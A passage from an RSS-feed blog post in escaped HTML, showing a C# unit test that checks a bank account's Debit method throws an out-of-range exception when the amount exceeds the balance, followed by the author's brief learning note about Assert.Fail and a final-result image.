&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Debit_WhenAmountIsMoreThanBalance_ShouldThrowArgumentOutOfRange()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Arrange&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> beginningBalance = &lt;span style="color:#ae81ff">11.99&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> debitAmount = &lt;span style="color:#ae81ff">20.0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BankAccount account = &lt;span style="color:#66d9ef">new&lt;/span> BankAccount(&lt;span style="color:#e6db74">&amp;#34;Mr. Bryan Walton&amp;#34;&lt;/span>, beginningBalance);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Act&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> account.Debit(debitAmount);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (System.ArgumentOutOfRangeException e)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Assert&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> StringAssert.Contains(e.Message, BankAccount.DebitAmountExceedsBalanceMessage);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="the-last-part">
 The last part
 &lt;a class="anchor" href="#the-last-part">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Not really understatnd about adding Assert.Fail at the end of the test method.&lt;/li>
&lt;/ul>
&lt;h2 id="final-result">
 Final Result
 &lt;a class="anchor" href="#final-result">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://imgur.com/5NtqEKr.png" alt="" />&lt;/p></description></item></channel></rss>